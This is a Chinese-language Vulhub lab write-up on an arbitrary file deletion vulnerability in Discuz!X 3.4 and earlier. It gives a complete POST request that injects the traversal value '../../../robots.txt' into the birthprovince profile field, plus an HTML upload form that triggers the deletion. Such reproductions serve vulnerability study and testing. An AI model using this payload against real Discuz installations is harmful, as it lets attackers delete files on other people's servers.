# Discuz!X ≤3.4 任意文件删除漏洞

## 漏洞描述

漏洞详情：[https://lorexxar.cn/2017/09/30/dz-delete/](https://lorexxar.cn/2017/09/30/dz-delete/#tdsub)

## 漏洞影响

```plain
Discuz!X ≤3.4
```

## 环境搭建

Vulhub执行下列命令部署 Discuz!X 安装环境

```plain
docker-compose up -d
```

启动后，访问http://your-ip/install/来安装discuz，只用修改数据库地址为db，其他保持默认即可。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841447099-5e96bd1c-cf27-4349-856f-42297845fb3e.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841447001-871a936c-3a21-4b98-91fc-4b4e43401e90.png)

## 漏洞复现

访问http://your-ip/robots.txt可见robots.txt是存在的：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841447166-592071a4-e840-4e6a-8e72-08c75765567e.png)

注册用户后，在个人设置页面找到自己的formhash：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841447401-22b98725-77e6-4981-8e00-8655065509e3.png)

带上自己的Cookie、formhash发送如下数据包：

```plain
POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
Host: localhost
Content-Length: 367
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: [your cookie]
Connection: close

------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="formhash"

[your formhash]
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="birthprovince"

../../../robots.txt
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="profilesubmit"

1
------WebKitFormBoundaryPFvXyxL45f34L12s--
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841447340-71e04c49-6dd0-4046-87bf-bdae42ad1555.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841448182-acd53ddb-4d4f-4aef-94e5-ea7d4b9d1e35.png)

记得回到Proxy里面修改完再Forward才有效果.

提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841448255-616e5447-5524-4ff3-936f-c5a9348c8ce8.png)

说明我们的脏数据已经进入数据库了。

然后，新建一个upload.html，代码如下，将其中的[your-ip]改成discuz的域名，[form-hash]改成你的formhash：

```plain
<body>
    <form action="http://[your-ip]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]" method="post" enctype="multipart/form-data">
        <input type="file" name="birthprovince" />
        <input type="submit" value="upload" />
    </form>
</body>
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841448445-7f0381c9-a5bc-4308-85ac-d6b9c0f54932.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841449109-adc08918-b847-4d44-b12e-637d4d159344.png)

用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。

再次访问http://your-ip/robots.txt，发现文件成功被删除：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841449639-9b2f1393-2648-44d8-8749-14b97885f8a0.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780841449546-4075a62e-578f-4af0-be0d-fb12e4dccaf8.png)